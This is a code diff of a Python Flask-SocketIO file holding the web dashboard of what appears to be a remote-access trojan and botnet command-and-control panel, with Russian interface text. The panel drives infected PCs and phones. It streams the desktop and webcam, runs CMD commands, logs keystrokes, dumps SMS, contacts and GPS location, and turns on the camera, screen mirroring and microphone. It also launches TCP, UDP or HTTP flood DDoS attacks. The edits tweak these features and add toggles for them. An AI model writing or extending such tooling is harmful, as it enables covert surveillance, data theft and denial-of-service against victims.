@@ -22,43 +22,33 @@ HTML = """
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap');
         body { font-family: 'Inter', sans-serif; background-color: #0b0f19; color: #c9d1d9; }
         .font-mono { font-family: 'JetBrains Mono', monospace; }
-        
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: #0b0f19; }
         ::-webkit-scrollbar-thumb { background: #1f2937; border-radius: 4px; }
         ::-webkit-scrollbar-thumb:hover { background: #374151; }
-        
         .sidebar { background-color: #111827; border-right: 1px solid #1f2937; z-index: 100; position: relative; }
         .sidebar-item { transition: all 0.2s ease; border-left: 3px solid transparent; }
         .sidebar-item:hover { background-color: #1f2937; border-left-color: #3b82f6; }
         .sidebar-item.active { background-color: #1f2937; border-left-color: #3b82f6; color: #fff; }
-        
         .client-row { transition: background-color 0.2s; }
         .client-row:hover { background-color: #1f2937; cursor: pointer; }
         .client-row.selected { background-color: #1e3a8a; border-left: 3px solid #60a5fa; }
-        
         .tab-btn { transition: all 0.2s; border-bottom: 2px solid transparent; }
         .tab-btn.active { border-bottom-color: #3b82f6; color: #60a5fa; }
-        .tab-btn:hover:not(.active) { color: #9ca3af; border-bottom-color: #4b5563; }
-        
         .toggle-switch { position: relative; display: inline-block; width: 40px; height: 22px; }
         .toggle-switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #374151; transition: .3s; border-radius: 22px; }
         .slider:before { position: absolute; content: ""; height: 16px; width: 16px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
         input:checked + .slider { background-color: #10b981; }
         input:checked + .slider:before { transform: translateX(18px); }
-        
         input[type=range] { -webkit-appearance: none; width: 100%; background: transparent; }
         input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; height: 16px; width: 16px; border-radius: 50%; background: #60a5fa; cursor: pointer; margin-top: -6px; }
         input[type=range]::-webkit-slider-runnable-track { width: 100%; height: 4px; cursor: pointer; background: #374151; border-radius: 2px; }
-        
-        .chat-bubble { max-width: 70%; padding: 8px 12px; border-radius: 12px; margin-bottom: 8px; font-size: 14px; line-height: 1.4; word-wrap: break-word; }
+        .chat-bubble { max-width: 70%; padding: 8px 12px; border-radius: 12px; margin-bottom: 8px; font-size: 14px; word-wrap: break-word; }
         .chat-admin { background-color: #1d4ed8; color: white; margin-left: auto; border-bottom-right-radius: 2px; }
         .chat-client { background-color: #374151; color: #e5e7eb; margin-right: auto; border-bottom-left-radius: 2px; }
-        
         .fade-in { animation: fadeIn 0.3s ease-in-out forwards; }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
-        
         .dropdown-wrap { position: relative; width: 100%; padding: 10px; border-bottom: 1px solid #1f2937; background: #0d1117; }
         .dropdown-btn { width: 100%; display: flex; justify-content: space-between; align-items: center; background: #1f2937; color: #e5e7eb; padding: 10px 14px; border-radius: 8px; font-size: 13px; font-weight: 600; cursor: pointer; border: 1px solid #374151; transition: all 0.2s ease; }
         .dropdown-btn:hover { background: #374151; border-color: #3b82f6; }
@@ -81,7 +71,7 @@ HTML = """
             <div class="w-8 h-8 rounded bg-blue-600 flex items-center justify-center text-white font-bold shadow-lg shadow-blue-500/30">C2</div>
             <div>
                 <h1 class="text-sm font-bold text-white tracking-wide">DASHBOARD</h1>
-                <p class="text-[10px] text-gray-500 font-mono">v4.2.0</p>
+                <p class="text-[10px] text-gray-500 font-mono">v6.0.0</p>
             </div>
         </div>
 
@@ -110,7 +100,7 @@ HTML = """
             <div id="pc-menu" class="space-y-1 hidden">
                 <div onclick="switchView('control')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-gamepad w-4 text-center"></i> Control</div>
                 <div onclick="switchView('system')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-sliders w-4 text-center"></i> System</div>
-                <div onclick="switchView('network')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-network-wired w-4 text-center"></i> Network (DDoS)</div>
+                <div onclick="switchView('network')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-network-wired w-4 text-center"></i> DDoS</div>
                 <div onclick="switchView('chat')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-comments w-4 text-center"></i> Chat</div>
             </div>
 
@@ -118,7 +108,6 @@ HTML = """
                 <div onclick="switchView('phone-info')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-mobile-button w-4 text-center"></i> Info</div>
                 <div onclick="switchView('phone-sms')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-sms w-4 text-center"></i> SMS</div>
                 <div onclick="switchView('phone-contacts')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-address-book w-4 text-center"></i> Contacts</div>
-                <div onclick="switchView('phone-tg')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-brands fa-telegram w-4 text-center"></i> Telegram</div>
                 <div onclick="switchView('phone-gps')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-location-dot w-4 text-center"></i> GPS</div>
                 <div onclick="switchView('phone-cam')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-camera w-4 text-center"></i> Camera</div>
                 <div onclick="switchView('phone-screen')" class="sidebar-item flex items-center gap-3 px-3 py-2 rounded text-sm text-gray-400"><i class="fa-solid fa-tv w-4 text-center"></i> Screen</div>
@@ -130,7 +119,6 @@ HTML = """
     </aside>
 
     <main class="flex-1 flex flex-col h-full bg-[#0b0f19] relative z-10">
-        
         <header class="h-14 border-b border-gray-800 flex items-center justify-between px-6 bg-[#111827]">
             <div class="flex items-center gap-4">
                 <h2 id="active-client-name" class="text-sm font-semibold text-gray-300">Выберите клиента</h2>
@@ -138,8 +126,7 @@ HTML = """
                 <span id="active-client-uptime" class="text-xs font-mono text-gray-500"></span>
             </div>
             <div class="flex items-center gap-2 text-xs font-mono text-gray-400">
-                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div>
-                SYSTEM ONLINE
+                <div class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></div> SYSTEM ONLINE
             </div>
         </header>
 
@@ -148,6 +135,7 @@ HTML = """
             <p class="text-sm font-mono">NO CLIENT SELECTED</p>
         </div>
 
+        <!-- PC CONTROL -->
         <div id="view-control" class="hidden flex-1 flex flex-col overflow-hidden fade-in">
             <div class="flex border-b border-gray-800 bg-[#111827] text-xs font-semibold text-gray-400">
                 <div onclick="switchTab('desktop', event)" class="tab-btn active px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-desktop"></i> Desktop</div>
@@ -157,7 +145,6 @@ HTML = """
                 <div onclick="switchTab('console', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-terminal"></i> CMD</div>
                 <div onclick="switchTab('processes', event)" class="tab-btn px-6 py-3 flex items-center gap-2"><i class="fa-solid fa-list"></i> Procs</div>
             </div>
-
             <div class="flex-1 overflow-y-auto p-6 relative">
                 <div id="tab-desktop" class="tab-content block">
                     <div class="flex items-center gap-4 mb-4">
@@ -237,15 +224,16 @@ HTML = """
             </div>
         </div>
 
+        <!-- PC SYSTEM -->
         <div id="view-system" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">System Management</h2>
             <div class="grid grid-cols-2 gap-4 max-w-4xl">
-                <button onclick="systemCmd('shutdown')" class="bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-power-off"></i> Выключить ПК</button>
-                <button onclick="systemCmd('restart')" class="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-900/50 text-orange-400 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-rotate-right"></i> Перезагрузить ПК</button>
-                <button onclick="systemCmd('logoff')" class="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-900/50 text-yellow-400 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-right-from-bracket"></i> Выйти из аккаунта</button>
-                <button onclick="systemCmd('monitor_off')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-tv"></i> Выключить монитор</button>
-                <button onclick="systemCmd('hide_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-window-maximize"></i> Скрыть панель задач</button>
-                <button onclick="systemCmd('show_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg transition-all flex items-center justify-center gap-3"><i class="fa-solid fa-window-restore"></i> Показать панель задач</button>
+                <button onclick="systemCmd('shutdown')" class="bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-power-off"></i> Выключить ПК</button>
+                <button onclick="systemCmd('restart')" class="bg-orange-900/30 hover:bg-orange-900/50 border border-orange-900/50 text-orange-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-rotate-right"></i> Перезагрузить ПК</button>
+                <button onclick="systemCmd('logoff')" class="bg-yellow-900/30 hover:bg-yellow-900/50 border border-yellow-900/50 text-yellow-400 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-right-from-bracket"></i> Выйти из аккаунта</button>
+                <button onclick="systemCmd('monitor_off')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-tv"></i> Выключить монитор</button>
+                <button onclick="systemCmd('hide_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-window-maximize"></i> Скрыть панель задач</button>
+                <button onclick="systemCmd('show_taskbar')" class="bg-gray-800 hover:bg-gray-700 border border-gray-700 text-gray-300 font-bold py-4 rounded-lg flex items-center justify-center gap-3"><i class="fa-solid fa-window-restore"></i> Показать панель задач</button>
             </div>
 
             <hr class="border-gray-800 my-8 max-w-4xl">
@@ -254,10 +242,7 @@ HTML = """
             <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 flex items-center gap-6">
                 <div class="flex items-center gap-3">
                     <button onclick="toggleMute()" id="vol-icon" class="text-2xl text-gray-300 hover:text-white transition-colors"><i class="fa-solid fa-volume-high"></i></button>
-                    <label class="toggle-switch" title="Заблокировать на 100%">
-                        <input type="checkbox" id="toggle-vol-lock" onchange="toggleVolLock(this.checked)">
-                        <span class="slider"></span>
-                    </label>
+                    <label class="toggle-switch" title="Заблокировать на 100%"><input type="checkbox" id="toggle-vol-lock" onchange="toggleVolLock(this.checked)"><span class="slider"></span></label>
                     <i class="fa-solid fa-lock text-xs text-gray-500" id="lock-icon"></i>
                 </div>
                 <div class="flex-1 flex items-center gap-4">
@@ -273,63 +258,47 @@ HTML = """
                 <div class="flex flex-col gap-2">
                     <label class="text-xs font-bold text-gray-400 uppercase">Fake Error Message</label>
                     <div class="flex gap-2">
-                        <input type="text" id="troll-title" class="w-1/3 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm" placeholder="Заголовок">
-                        <input type="text" id="troll-text" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm" placeholder="Текст ошибки...">
-                        <button onclick="sendTroll('msgbox')" class="bg-red-600 hover:bg-red-500 text-white px-6 py-2 rounded font-bold text-sm transition-colors">Показать</button>
+                        <input type="text" id="troll-title" class="w-1/3 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="Заголовок">
+                        <input type="text" id="troll-text" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="Текст ошибки...">
+                        <button onclick="sendTroll('msgbox')" class="bg-red-600 hover:bg-red-500 text-white px-6 py-2 rounded font-bold text-sm">Показать</button>
                     </div>
                 </div>
-
                 <div class="flex flex-col gap-2">
                     <label class="text-xs font-bold text-gray-400 uppercase">Open URL</label>
                     <div class="flex gap-2">
-                        <input type="text" id="troll-url" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-blue-500 text-sm" placeholder="https://...">
-                        <button onclick="sendTroll('openurl')" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded font-bold text-sm transition-colors">Открыть</button>
+                        <input type="text" id="troll-url" class="flex-1 bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="https://...">
+                        <button onclick="sendTroll('openurl')" class="bg-blue-600 hover:bg-blue-500 text-white px-6 py-2 rounded font-bold text-sm">Открыть</button>
                     </div>
                 </div>
-
                 <div class="flex gap-4">
-                    <button onclick="sendTroll('flip_mouse')" class="flex-1 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-900/50 text-purple-400 font-bold py-3 rounded transition-all flex items-center justify-center gap-2"><i class="fa-solid fa-arrows-left-right"></i> Перевернуть мышь</button>
-                    <button onclick="sendTroll('block_input')" class="flex-1 bg-pink-900/30 hover:bg-pink-900/50 border border-pink-900/50 text-pink-400 font-bold py-3 rounded transition-all flex items-center justify-center gap-2"><i class="fa-solid fa-keyboard"></i> Блок ввода (5 сек)</button>
-                    <button onclick="systemCmd('disable_taskmgr')" class="flex-1 bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-3 rounded transition-all flex items-center justify-center gap-2"><i class="fa-solid fa-ban"></i> Заблокировать Диспетчер</button>
+                    <button onclick="sendTroll('flip_mouse')" class="flex-1 bg-purple-900/30 hover:bg-purple-900/50 border border-purple-900/50 text-purple-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-arrows-left-right"></i> Перевернуть мышь</button>
+                    <button onclick="sendTroll('block_input')" class="flex-1 bg-pink-900/30 hover:bg-pink-900/50 border border-pink-900/50 text-pink-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-keyboard"></i> Блок ввода (5 сек)</button>
+                    <button onclick="systemCmd('disable_taskmgr')" class="flex-1 bg-red-900/30 hover:bg-red-900/50 border border-red-900/50 text-red-400 font-bold py-3 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-ban"></i> Заблокировать Диспетчер</button>
                 </div>
             </div>
         </div>
 
+        <!-- PC NETWORK (DDoS) -->
         <div id="view-network" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">DDoS Attack</h2>
             <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 space-y-4">
                 <div class="grid grid-cols-2 gap-4">
-                    <div class="flex flex-col gap-2">
-                        <label class="text-xs font-bold text-gray-400 uppercase">Target IP / Domain</label>
-                        <input type="text" id="ddos-ip" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm" placeholder="1.1.1.1">
-                    </div>
-                    <div class="flex flex-col gap-2">
-                        <label class="text-xs font-bold text-gray-400 uppercase">Port</label>
-                        <input type="number" id="ddos-port" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm" placeholder="80">
-                    </div>
+                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Target IP / Domain</label><input type="text" id="ddos-ip" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="1.1.1.1"></div>
+                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Port</label><input type="number" id="ddos-port" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" placeholder="80"></div>
                 </div>
                 <div class="grid grid-cols-2 gap-4">
-                    <div class="flex flex-col gap-2">
-                        <label class="text-xs font-bold text-gray-400 uppercase">Method</label>
-                        <select id="ddos-method" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm">
-                            <option value="TCP">TCP Flood</option>
-                            <option value="UDP">UDP Flood</option>
-                            <option value="HTTP">HTTP Flood</option>
-                        </select>
-                    </div>
-                    <div class="flex flex-col gap-2">
-                        <label class="text-xs font-bold text-gray-400 uppercase">Threads</label>
-                        <input type="number" id="ddos-threads" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded focus:outline-none focus:border-red-500 text-sm" value="50">
-                    </div>
+                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Method</label><select id="ddos-method" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm"><option value="TCP">TCP</option><option value="UDP">UDP</option><option value="HTTP">HTTP</option></select></div>
+                    <div class="flex flex-col gap-2"><label class="text-xs font-bold text-gray-400 uppercase">Threads</label><input type="number" id="ddos-threads" class="bg-[#0b0f19] border border-gray-700 text-white p-2 rounded text-sm" value="50"></div>
                 </div>
                 <div class="flex gap-4 pt-4">
-                    <button onclick="startDdos()" class="flex-1 bg-red-600 hover:bg-red-500 text-white font-bold py-4 rounded transition-all flex items-center justify-center gap-2"><i class="fa-solid fa-crosshairs"></i> Запустить Атаку</button>
-                    <button onclick="stopDdos()" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-bold py-4 rounded transition-all flex items-center justify-center gap-2"><i class="fa-solid fa-stop"></i> Остановить</button>
+                    <button onclick="startDdos()" class="flex-1 bg-red-600 hover:bg-red-500 text-white font-bold py-4 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-crosshairs"></i> Запустить</button>
+                    <button onclick="stopDdos()" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white font-bold py-4 rounded flex items-center justify-center gap-2"><i class="fa-solid fa-stop"></i> Стоп</button>
                 </div>
                 <div id="ddos-status" class="text-center text-gray-500 mt-4">Ожидание...</div>
             </div>
         </div>
 
+        <!-- CHAT -->
         <div id="view-chat" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
             <div class="flex justify-between items-center mb-4 max-w-4xl">
                 <h2 class="text-lg font-bold text-white">Live Chat</h2>
@@ -350,6 +319,7 @@ HTML = """
             </div>
         </div>
 
+        <!-- PHONE VIEWS -->
         <div id="view-phone-info" class="hidden flex-1 p-6 overflow-y-auto fade-in">
             <h2 class="text-lg font-bold text-white mb-6">Phone Info</h2>
             <div class="max-w-4xl bg-[#111827] border border-gray-800 rounded-lg p-6 font-mono text-sm space-y-2" id="phone-info-data"></div>
@@ -368,13 +338,6 @@ HTML = """
             </div>
             <div id="contacts-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
         </div>
-        <div id="view-phone-tg" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6">
-            <div class="flex justify-between items-center mb-4 max-w-4xl">
-                <h2 class="text-lg font-bold text-white">Telegram Data</h2>
-                <button onclick="dumpData('tg')" class="bg-blue-600 hover:bg-blue-500 text-white px-4 py-2 rounded text-sm"><i class="fa-solid fa-download"></i> Дамп Telegram</button>
-            </div>
-            <div id="tg-list" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-4 overflow-y-auto font-mono text-sm whitespace-pre-wrap text-gray-300"></div>
-        </div>
         <div id="view-phone-gps" class="hidden flex-1 p-6 overflow-y-auto fade-in flex-col">
             <div class="flex justify-between items-center mb-4 max-w-4xl">
                 <h2 class="text-lg font-bold text-white">GPS Location</h2>
@@ -382,28 +345,50 @@ HTML = """
             </div>
             <div id="gps-data" class="flex-1 bg-[#111827] border border-gray-800 rounded-lg p-6 flex flex-col items-center justify-center text-gray-400 font-mono">Ожидание...</div>
         </div>
+        
         <div id="view-phone-cam" class="hidden flex-1 p-6 overflow-y-auto fade-in">
-            <h2 class="text-lg font-bold text-white mb-4">Camera</h2>
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold text-white">Camera</h2>
+                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
+                    <span class="text-xs text-gray-400">Включить камеру</span>
+                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('camera', this.checked)"><span class="slider"></span></label>
+                </div>
+            </div>
             <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                 <img id="cam-img" src="" class="max-h-full max-w-full object-contain hidden">
                 <span id="cam-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
             </div>
         </div>
+        
         <div id="view-phone-screen" class="hidden flex-1 p-6 overflow-y-auto fade-in">
-            <h2 class="text-lg font-bold text-white mb-4">Screen Mirror</h2>
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold text-white">Screen Mirror</h2>
+                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
+                    <span class="text-xs text-gray-400">Включить экран</span>
+                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('screen', this.checked)"><span class="slider"></span></label>
+                </div>
+            </div>
             <div class="border border-gray-800 rounded-lg bg-black h-[500px] flex items-center justify-center relative">
                 <img id="scr-img" src="" class="max-h-full max-w-full object-contain hidden">
                 <span id="scr-placeholder" class="text-gray-700 font-mono text-sm">STREAM OFFLINE</span>
             </div>
         </div>
+        
         <div id="view-phone-mic" class="hidden flex-1 p-6 overflow-y-auto fade-in">
-            <h2 class="text-lg font-bold text-white mb-4">Microphone</h2>
+            <div class="flex items-center justify-between mb-4">
+                <h2 class="text-lg font-bold text-white">Microphone</h2>
+                <div class="flex items-center gap-3 bg-[#111827] px-4 py-2 rounded border border-gray-800">
+                    <span class="text-xs text-gray-400">Слушать</span>
+                    <label class="toggle-switch"><input type="checkbox" onchange="toggleFeature('mic', this.checked)"><span class="slider"></span></label>
+                </div>
+            </div>
             <div class="border border-gray-800 rounded-lg bg-black h-[300px] flex flex-col items-center justify-center text-gray-600">
                 <i class="fa-solid fa-headphones text-6xl mb-4 text-green-500/50"></i>
                 <p class="font-mono text-sm">AUDIO STREAM ACTIVE</p>
             </div>
         </div>
 
+        <!-- SPY LOGS -->
         <div id="view-keylog" class="hidden flex-1 flex flex-col overflow-hidden fade-in p-6 space-y-4">
             <div class="flex-1 flex flex-col min-h-0">
                 <div class="flex justify-between items-center mb-2 max-w-4xl">
@@ -428,7 +413,6 @@ HTML = """
         const socket = io();
         let currentClientId = null;
         let currentPlatform = null;
-        let audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         let downloadChunks = {};
         let volLocked = false;
         let lastClientsData = {};
@@ -499,6 +483,7 @@ HTML = """
                 if (currentPlatform === 'pc' && isPhone) continue;
                 if (currentPlatform === 'phone' && !isPhone) continue;
                 count++;
+                
                 const up = Math.floor(Date.now() / 1000 - c.connected_at);
                 const isOnline = c.screen_on !== false;
 
@@ -556,6 +541,7 @@ HTML = """
             if (tabId === 'explorer') requestDir('C:/');
         }
 
+        // --- PC LOGIC ---
         function startDdos() {
             const ip = document.getElementById('ddos-ip').value, port = document.getElementById('ddos-port').value, method = document.getElementById('ddos-method').value, threads = document.getElementById('ddos-threads').value;
             if (!ip || !port) return alert('Введи IP и порт!');
@@ -689,15 +675,8 @@ HTML = """
         });
         socket.on('screen_frame', (data) => { const img = document.getElementById('screen'); img.src = 'data:image/jpeg;base64,' + data; img.style.display = 'block'; });
         socket.on('webcam_frame', (data) => { const img = document.getElementById('webcam'); img.src = 'data:image/jpeg;base64,' + data; img.style.display = 'block'; });
-        socket.on('mic_audio', (data) => {
-            if (!document.getElementById('toggle-mic').checked) return;
-            const binary = atob(data); const bytes = new Uint8Array(binary.length);
-            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-            const buffer = audioCtx.createBuffer(1, bytes.length / 2, 44100); const channelData = buffer.getChannelData(0); const dataView = new DataView(bytes.buffer);
-            for (let i = 0; i < bytes.length / 2; i++) channelData[i] = dataView.getInt16(i * 2, true) / 32768;
-            const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination); source.start();
-        });
 
+        // --- PHONE LOGIC ---
         function dumpData(type) {
             if (!currentClientId) return;
             socket.emit('cmd_dump', { client_id: currentClientId, type: type });
@@ -706,12 +685,12 @@ HTML = """
             if (data.client_id !== currentClientId) return;
             if (data.type === 'sms') document.getElementById('sms-list').innerText = JSON.stringify(data.payload, null, 2);
             if (data.type === 'contacts') document.getElementById('contacts-list').innerText = JSON.stringify(data.payload, null, 2);
-            if (data.type === 'tg') document.getElementById('tg-list').innerText = JSON.stringify(data.payload, null, 2);
             if (data.type === 'geo') {
                 const g = data.payload;
                 document.getElementById('gps-data').innerHTML = `<a href="https://www.google.com/maps?q=${g.lat},${g.lon}" target="_blank" class="text-blue-400 hover:underline"><i class="fa-solid fa-map-location-dot mr-2"></i>Широта: ${g.lat}, Долгота: ${g.lon}</a>`;
             }
         });
+
         socket.on('phone_cam', (data) => {
             if (data.client_id === currentClientId) {
                 const img = document.getElementById('cam-img'); img.src = 'data:image/jpeg;base64,' + data.img;
@@ -724,17 +703,8 @@ HTML = """
                 img.classList.remove('hidden'); document.getElementById('scr-placeholder').classList.add('hidden');
             }
         });
-        socket.on('phone_mic', (data) => {
-            if (data.client_id === currentClientId && !document.getElementById('view-phone-mic').classList.contains('hidden')) {
-                const binary = atob(data.data); const bytes = new Uint8Array(binary.length);
-                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-                const buffer = audioCtx.createBuffer(1, bytes.length / 2, 44100);
-                const channelData = buffer.getChannelData(0); const dataView = new DataView(bytes.buffer);
-                for (let i = 0; i < bytes.length / 2; i++) channelData[i] = dataView.getInt16(i * 2, true) / 32768;
-                const source = audioCtx.createBufferSource(); source.buffer = buffer; source.connect(audioCtx.destination); source.start();
-            }
-        });
 
+        // --- SPY LOGS ---
         socket.on('keylog', (data) => {
             if (data.client_id === currentClientId && !document.getElementById('view-keylog').classList.contains('hidden')) {
                 const out = document.getElementById('keylog-output'); out.innerText += data.data; out.scrollTop = out.scrollHeight;
@@ -815,10 +785,6 @@ def handle_phone_cam(data):
 @socketio.on('phone_screen')
 def handle_phone_screen(data):
     socketio.emit('phone_screen', data)
-
-@socketio.on('phone_mic')
-def handle_phone_mic(data):
-    socketio.emit('phone_mic', data)
 
 @socketio.on('keylog')
 def handle_keylog(data):
